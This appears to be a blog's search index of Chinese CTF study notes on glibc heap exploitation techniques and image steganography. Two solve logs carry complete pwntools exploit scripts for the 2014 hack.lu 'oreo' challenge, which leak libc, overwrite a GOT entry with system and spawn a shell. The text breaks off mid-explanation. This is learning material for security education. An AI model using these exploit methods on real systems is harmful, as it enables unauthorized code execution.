<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>house of einherjar</title>
      <link href="/2020/03/16/house-of-einherjar/"/>
      <url>/2020/03/16/house-of-einherjar/</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h3><p>申请两个堆块A、B，其中A申请0x38字节，B申请0xf8字节。</p><p>A用了B的prev_size段且能够造成off-by-null覆盖B的size段最低字节。</p><p>构造一个fake chunk，prev_size和size都为0x100，fd、bk、fd_nextsize、bk_nextsize都指向自己。</p><p>修改A的最后8字节，即B的prev_size段：</p><pre class="line-numbers language-c"><code class="language-c">prev_size <span class="token operator">=</span> b_addr <span class="token operator">-</span> fake_addr<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并利用off-by-null将B的size段最低字节覆盖为0</p><p>此时libc会认为B的前一个堆块处于释放状态，并且通过<code>b_addr-prev_size</code>找到前一个堆块的地址，这样就会把fake chunk误认为B的前一块相邻的释放的堆块。</p><p>再释放B，B就会向前合并，与fake chunk合并。</p><p>这样，top就指向fake chunk，以后从top chunk出来的堆块都会从fake chunk出来。此时再<code>malloc(200)</code>，得到的地址就是<code>fake_addr+0x10</code></p><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><p>有off by null</p><p>已知栈上的地址并且能写入。</p><h4 id="参考网页："><a href="#参考网页：" class="headerlink" title="参考网页："></a>参考网页：</h4><p><a href="https://www.cnblogs.com/pfcode/p/10999252.html" target="_blank" rel="noopener">https://www.cnblogs.com/pfcode/p/10999252.html</a></p><p><a href="https://www.jianshu.com/p/5e1dc7e639f2" target="_blank" rel="noopener">https://www.jianshu.com/p/5e1dc7e639f2</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> house of einherjar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of orange</title>
      <link href="/2020/03/16/house-of-orange/"/>
      <url>/2020/03/16/house-of-orange/</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h3><p>house of orange的核心在于<strong>在没有free函数的情况下得到一个释放的堆块</strong></p><p>原理简单来说就是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并置入unsortedbin中，通过这一点可以在没有free函数的情况下获取到unsortedbin</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p><strong>1.</strong>创建第一个chunk，修改top chunk的size，需要满足以下条件：</p><ul><li>大于MINSIZE（一般为0x10）</li><li>小于接下来申请的chunk大小+MINSIZE</li><li>prev inuse位设置为1</li><li>old_top+old_size的值是页对齐的（即0x1000的整数倍）</li></ul><p><strong>2.</strong>创建第二个chunk，触发sysmalloc中的_int_free</p><p>如果申请大小&gt;=mp_.mmap_threshold，就会mmap，只要申请不过大，一般不会触发（一般默认为128k，即0x20000）</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>house of orange一般与IO_FILE配合使用</p><p>关于IO_FILE的内容，还没有完全弄懂</p><h4 id="参考网页"><a href="#参考网页" class="headerlink" title="参考网页"></a>参考网页</h4><p><a href="https://wiki.x10sec.org/pwn/heap/house_of_orange/#_1" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/house_of_orange/#_1</a></p><p><a href="https://www.anquanke.com/post/id/168802" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168802</a> （IO_FILE）</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> house of orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unsortedbin attack&amp;largebin attack</title>
      <link href="/2020/03/13/unsortedbin-attack-largebin-attack/"/>
      <url>/2020/03/13/unsortedbin-attack-largebin-attack/</url>
      
        <content type="html"><![CDATA[<p><img src="01.jpg" alt="01"></p><p><img src="02.jpg" alt="02"></p><p><img src="03.jpg" alt="03"></p><p><img src="04.jpg" alt="04"></p><h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><p><a href="https://www.cnblogs.com/pfcode/p/10995649.html" target="_blank" rel="noopener">https://www.cnblogs.com/pfcode/p/10995649.html</a></p><p><a href="https://www.jianshu.com/p/d3382102c0c0" target="_blank" rel="noopener">https://www.jianshu.com/p/d3382102c0c0</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> unsortedbin attack </tag>
            
            <tag> largebin attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of lore</title>
      <link href="/2020/03/12/house-of-lore/"/>
      <url>/2020/03/12/house-of-lore/</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h3><p><a href="https://www.cnblogs.com/pfcode/p/10991737.html" target="_blank" rel="noopener">https://www.cnblogs.com/pfcode/p/10991737.html</a></p><p><a href="https://www.jianshu.com/p/a44d455b9d8e" target="_blank" rel="noopener">https://www.jianshu.com/p/a44d455b9d8e</a></p><p><img src="01.png" alt="01"></p><p><img src="02.png" alt="02"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> smallbin </tag>
            
            <tag> house of lore </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>做题记录_20200312</title>
      <link href="/2020/03/12/zuo-ti-ji-lu-20200312/"/>
      <url>/2020/03/12/zuo-ti-ji-lu-20200312/</url>
      
        <content type="html"><![CDATA[<h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h3><p>复现完成</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./oreo'</span><span class="token punctuation">)</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./oreo'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>strlen_got <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span>puts_off <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>sys_off <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>des<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">order</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>notice<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>notice<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">27</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token string">'bbbb'</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    show<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'========\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'========\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Description: '</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    base <span class="token operator">=</span> data <span class="token operator">-</span> puts_off    <span class="token keyword">return</span> basebase <span class="token operator">=</span> leak<span class="token punctuation">(</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> base <span class="token operator">+</span> sys_off<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token string">'cccc'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>name <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">27</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804a2a8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'dddd'</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>order<span class="token punctuation">(</span><span class="token punctuation">)</span>des <span class="token operator">=</span> p32<span class="token punctuation">(</span>strlen_got<span class="token number">-8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>des<span class="token punctuation">,</span><span class="token string">'eeee'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload = p32(sys_addr) + ';/bin/sh\x00'</span>payload <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="01.jpg" alt="01"></p><p><img src="02.png" alt="02"></p><h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping chunks"></a>overlapping chunks</h3><p><img src="03.png" alt="03"></p><p><img src="04.png" alt="04"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> overlapping chunks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of force</title>
      <link href="/2020/03/12/house-of-force/"/>
      <url>/2020/03/12/house-of-force/</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p>利用堆溢出修改top chunk的size，将其覆盖为-1，即0xFFFFFFFFFFFFFFFF，这样就可以分配堆块到任意地址，实现任意地址写。</p><p>例如，现在top chunk在old_top处，要覆盖的地址为dest，计算<code>req=dest-old_top-4*sizeof(long)</code></p><p>然后malloc(req)，此时top chunk在dest-2*sizeof(long)处，再malloc一个堆块，这个堆块的数据段正好在dest处，可以对dest处进行写入。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> house of force </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分离图片</title>
      <link href="/2020/03/12/fen-chi-tu-pian/"/>
      <url>/2020/03/12/fen-chi-tu-pian/</url>
      
        <content type="html"><![CDATA[<h3 id="关于分离图片"><a href="#关于分离图片" class="headerlink" title="关于分离图片"></a>关于分离图片</h3><p>用binwalk查看</p><pre><code>binwalk 1.jpg</code></pre><p>1、用binwalk或foremost分离</p><pre><code>binwalk 1.jpg -eforemost 1.jpg</code></pre><p>2、用winhex手动分离</p><p>3、直接改扩展名（不适用于两个相同格式文件的情况）</p><p>参考网页：</p><p><a href="https://www.cnblogs.com/jiaxinguoguo/p/7351202.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiaxinguoguo/p/7351202.html</a></p><h3 id="第一部分-附加式的图片隐写"><a href="#第一部分-附加式的图片隐写" class="headerlink" title="第一部分 附加式的图片隐写"></a>第一部分 附加式的图片隐写</h3><p><a href="https://xz.aliyun.com/t/1833" target="_blank" rel="noopener">https://xz.aliyun.com/t/1833</a></p><p><strong>附加字符串</strong></p><p>直接把字符串隐藏在文件中，遇到这种情况可以用strings命令</p><pre><code>strings 1.jpg</code></pre><p><strong>图种形式的隐写</strong></p><p>将其他格式的文件与图片拼接在一起，分离的方法见昨天的文档</p><h3 id="第二部分-基于文件结构的隐写"><a href="#第二部分-基于文件结构的隐写" class="headerlink" title="第二部分 基于文件结构的隐写"></a>第二部分 基于文件结构的隐写</h3><p><a href="https://xz.aliyun.com/t/1836" target="_blank" rel="noopener">https://xz.aliyun.com/t/1836</a></p><p>需要熟悉各种文件格式的文件头以及数据块</p><p><strong>高度被修改引起的隐写</strong></p><p>找到png图片中的IHDR数据块，并找到高度位置，修改为一个较大的值即可</p><p>修改之后可能会因为被修改导致CRC校验报错，这时我们需要重新计算CRC校验值并修改</p><p><strong>隐写信息以IDAT块加入图片</strong></p><p>图片的IDAT块是可以有多个的，因此可以将隐写的信息以IDAT块的形式加入图片</p><p>使用pngcheck可以查看图片信息，找出有问题的IDAT块</p><h3 id="第三部分-基于LSB原理的图片隐写"><a href="#第三部分-基于LSB原理的图片隐写" class="headerlink" title="第三部分 基于LSB原理的图片隐写"></a>第三部分 基于LSB原理的图片隐写</h3><p><a href="https://xz.aliyun.com/t/1844" target="_blank" rel="noopener">https://xz.aliyun.com/t/1844</a></p><p>LSB即最低有效位</p><p>可以使用stegsolve软件</p>]]></content>
      
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 图片隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>做题记录_20200311</title>
      <link href="/2020/03/11/zuo-ti-ji-lu-20200311/"/>
      <url>/2020/03/11/zuo-ti-ji-lu-20200311/</url>
      
        <content type="html"><![CDATA[<h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h3><p>CTFwiki上的exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'DEBUG'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./oreo"</span>oreo <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./oreo"</span><span class="token punctuation">)</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./oreo"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'PID: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>descrip<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#p.recvuntil('Rifle name: ')</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#p.recvuntil('Rifle description: ')</span>    <span class="token comment" spellcheck="true">#sleep(0.5)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>descrip<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_rifle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'===================================\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">order</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>notice<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#p.recvuntil("Enter any notice you'd like to submit with your order: ")</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>notice<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'step 1. leak libc base'</span>    name <span class="token operator">=</span> <span class="token number">27</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>oreo<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">25</span> <span class="token operator">*</span> <span class="token string">'a'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    show_rifle<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'===================================\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Description: '</span><span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'step 2. free fake chunk at 0x0804A2A8'</span>    <span class="token comment" spellcheck="true"># now, oifle_cnt=1, we need set it = 0x40</span>    oifle <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> oifle <span class="token operator">&lt;</span> <span class="token number">0x3f</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># set next link=NULL</span>        add<span class="token punctuation">(</span><span class="token number">25</span> <span class="token operator">*</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">27</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        oifle <span class="token operator">+=</span> <span class="token number">1</span>    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">27</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a2a8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># set next link=0x0804A2A8, try to free a fake chunk</span>    add<span class="token punctuation">(</span><span class="token number">25</span> <span class="token operator">*</span> <span class="token string">'a'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># before free, we need to bypass some check</span>    <span class="token comment" spellcheck="true"># fake chunk's size is 0x40</span>    <span class="token comment" spellcheck="true"># 0x20 *'a' for padding the last fake chunk</span>    <span class="token comment" spellcheck="true"># 0x40 for fake chunk's next chunk's prev_size</span>    <span class="token comment" spellcheck="true"># 0x100 for fake chunk's next chunk's size</span>    <span class="token comment" spellcheck="true"># set fake iofle' next to be NULL</span>    payload <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">*</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>    message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># fastbin 0x40: 0x0804A2A0->some where heap->NULL</span>    order<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Okay order submitted!\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'step 3. get shell'</span>    <span class="token comment" spellcheck="true"># modify free@got to system addr</span>    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>oreo<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(p)</span>    message<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';/bin/sh\x00'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://wiki.x10sec.org/pwn/heap/fastbin_attack/#2014-hacklu-oreo" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/fastbin_attack/#2014-hacklu-oreo</a></p><p><strong>疑问</strong></p><p>1、直接运行程序时，程序会输出’Action: ‘我们在这之后输入指令，然而在运行exp时，程序不会输出’Action: ‘了</p><p>2、fastbin attack 和 House of Spirit 有什么区别</p><p>3、伪造fakechunk的时候为什么size处是0x40而不是0x41（试了一下，0x41也可以）</p><p>4、为什么伪造fakechunk时需要伪造nextchunk，看之前的教程 fastbin attack 不需要，但是 House of Spirit需要</p><p>5、nextchunk后面那一段：ljust(52, ‘b’)到ljust(128, ‘c’)的三行是什么（去掉之后不影响运行）</p><p>6、为什么要把system地址覆盖至strlen_got处，然后再在后面接上’;/bin/sh\x00’，为什么这样就可以成功getshell了</p><p><strong>疑问解答</strong></p><p>1、直接运行程序时，程序会输出’Action: ‘我们在这之后输入指令，然而在运行exp时，程序不会输出’Action: ‘了</p><blockquote><p>我个人感觉是缓冲区的问题，这个题没有一开始的setvbuf类似的操作，所以缓冲区需要回车带出来，不过为什么直接运行没问题，而exp里就不行，我还真不太清楚。可能是出题者故意恶心人，一边来说现在已经不会出现这种情况了。</p></blockquote><p>2、fastbin attack 和 House of Spirit 有什么区别。</p><blockquote><p>说实话，没什么区别，你可以理解成fastbin attack范围更广，记这几个名字的区别意义并不大，掌握技术其实就行了。而且看了这个题，跟fastbin attack根本没什么关系。。</p></blockquote><p>3、伪造fakechunk的时候为什么size处是0x40而不是0x41（试了一下，0x41也可以）</p><blockquote><p>因为这里的malloc只有一种情况就是0x38，32位里，0x38分配出来的实际上是0x40的那条fastbin链，所以必须是0x40，为了让它在对应的fastbin链上。0x40和0x41确实都可以，想要了解可以去看一下size最低三个bit位的作用，然后看free的源代码。不过记住以后最好用0x41。</p></blockquote><p>4、为什么伪造fakechunk时需要伪造nextchunk，看之前的教程 fastbin attack 不需要，但是 House of Spirit需要</p><blockquote><p>伪造fakechunk都是需要伪造nextchunk的，之前不需要，可能是因为你伪造的fakechunk的size刚刚好，相当于利用了系统帮助你伪造了nextchunk。具体的涉及free的后向合并机制。可以去看一下。</p></blockquote><p>5、nextchunk后面那一段：ljust(52, ‘b’)到ljust(128, ‘c’)的三行是什么（去掉之后不影响运行）</p><blockquote><p>ljust的意思，举个例子：比如a=”bbbb”.ljust(8, 